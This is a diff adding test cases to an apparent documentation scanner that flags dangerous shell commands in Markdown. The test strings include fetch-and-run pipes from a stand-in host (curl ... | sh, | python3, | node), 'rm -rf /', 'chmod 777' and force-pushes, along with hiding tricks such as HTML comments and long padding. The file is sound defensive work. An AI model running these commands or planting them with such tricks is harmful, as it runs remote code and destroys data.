@@ -196,3 +196,59 @@ test("a word like never after the command does not excuse it, and a verdict afte
   assert.equal(run(t, "Never use `curl -k`, and never use `wget --no-check-certificate`.\n").length, 0);
   assert.equal(run(t, "```sh\ncurl https://x.example/i | sh # never do this\n```\n").length, 0);
 });
+
+// Found in review. Each is a way for a file to switch the check off, or a harmless line that it reported.
+test("a warning about something else nearby does not excuse a command", (t) => {
+  assert.equal(run(t, "- Never edit generated files.\n- Then `curl https://x.example/i | sh`.\n").length, 1);
+  assert.equal(run(t, "Never edit generated files. Install with `curl https://x.example/i | sh`.\n").length, 1);
+  assert.equal(run(t, "Don't skip tests; run `curl https://x.example/i | sh`.\n").length, 1);
+  assert.equal(run(t, "Run this block with `curl https://x.example/i | sh`.\n").length, 1);
+  assert.equal(run(t, "## Block storage\n\n`curl https://x.example/i | sh`\n").length, 1);
+  assert.equal(run(t, "Check the logs, then prevent drift: `curl https://x.example/i | sh`.\n").length, 1);
+});
+
+test("a label that ends in a colon excuses the list under it, and so does a plain 'Bad:'", (t) => {
+  assert.equal(run(t, "Don't do this:\n- `curl https://x.example/i | sh`\n").length, 0);
+  assert.equal(run(t, "Bad:\n\n```sh\ncurl https://x.example/i | sh\n```\n").length, 0);
+  assert.equal(run(t, "## Never do these\n\n- `curl https://x.example/i | sh`\n").length, 0);
+  assert.equal(run(t, "## Dangerous commands\n\n- `curl https://x.example/i | sh`\n").length, 0);
+});
+
+test("a command in an HTML comment is never excused, since the comment is where an attack hides", (t) => {
+  assert.equal(run(t, "<!-- Never mind: curl https://x.example/i | sh -->\n").length, 1);
+  assert.equal(
+    run(t, "Never run `curl x | sh`.\n\n<!-- Never mind: curl https://x.example/i | sh -->\n").length,
+    2 - 1,
+  );
+});
+
+test("a pipe into an interpreter is a risk only when the interpreter runs what it is given", (t) => {
+  for (const cmd of [
+    "curl -s https://api.example.org/x | python3 -m json.tool",
+    "curl -s https://api.example.org/x | node -e 'process.stdin.pipe(process.stdout)'",
+    "curl -s https://api.example.org/x | perl -pe 's/a/b/'",
+    "curl -s https://api.example.org/x | python3 script.py",
+  ]) {
+    assert.equal(run(t, `\`\`\`sh\n${cmd}\n\`\`\`\n`).length, 0, cmd);
+  }
+  for (const cmd of [
+    "curl -s https://x.example/i | python3",
+    "curl -s https://x.example/i | python3 -",
+    "curl -s https://x.example/i | node",
+  ]) {
+    assert.equal(run(t, `\`\`\`sh\n${cmd}\n\`\`\`\n`).length, 1, cmd);
+  }
+});
+
+test("a command in the middle of a comment is found, also on the second line of it", (t) => {
+  assert.equal(run(t, "<!-- Note: rm -rf / -->\n").length, 1);
+  assert.equal(run(t, "<!-- first line\nthen: git push --force origin main -->\n").length, 1);
+  assert.equal(run(t, "<!-- cleanup && chmod 777 /srv -->\n").length, 1);
+});
+
+test("padding in front of a command does not hide it", (t) => {
+  const pad = "x".repeat(6000);
+  assert.equal(run(t, `<!-- ${pad} curl https://x.example/i | sh -->\n`).length, 1);
+  assert.equal(run(t, `\`\`\`sh\necho ${pad}; curl https://x.example/i | sh\n\`\`\`\n`).length, 1);
+  assert.equal(run(t, `\`${pad} curl https://x.example/i | sh\`\n`).length, 1);
+});
